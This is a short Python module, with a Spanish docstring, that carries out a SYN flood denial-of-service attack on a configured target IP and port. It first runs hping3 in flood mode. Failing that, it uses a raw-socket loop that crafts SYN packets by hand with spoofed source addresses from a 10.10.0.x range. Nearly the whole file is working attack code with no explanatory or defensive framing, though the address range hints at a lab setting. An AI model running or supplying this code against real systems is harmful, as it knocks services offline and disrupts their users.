"""SYN flood usando hping3 (preferido) o fallback raw-socket."""

from __future__ import annotations

import shutil
import subprocess
import time


def run(cfg: dict) -> int:
    if shutil.which("hping3"):
        cmd = [
            "hping3",
            "--flood",
            "-S",
            "-p",
            str(cfg["target_port"]),
            cfg["target_ip"],
        ]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(cfg["duration_s"])
        proc.terminate()
        proc.wait(timeout=5)
        return 0

    # fallback: raw socket (requiere CAP_NET_RAW)
    import random
    import socket
    import struct

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    target_ip = cfg["target_ip"]
    target_port = cfg["target_port"]
    end = time.time() + cfg["duration_s"]
    while time.time() < end:
        src_ip = f"10.10.0.{random.randint(100, 250)}"
        src_port = random.randint(1024, 65535)
        pkt = _craft_syn(src_ip, src_port, target_ip, target_port)
        try:
            sock.sendto(pkt, (target_ip, 0))
        except OSError:
            break
    return 0


def _craft_syn(src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> bytes:
    import socket
    import struct

    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40, 1, 0, 64, socket.IPPROTO_TCP, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port, 0, 0, (5 << 4), 0x02, 8192, 0, 0,
    )
    return ip_hdr + tcp_hdr
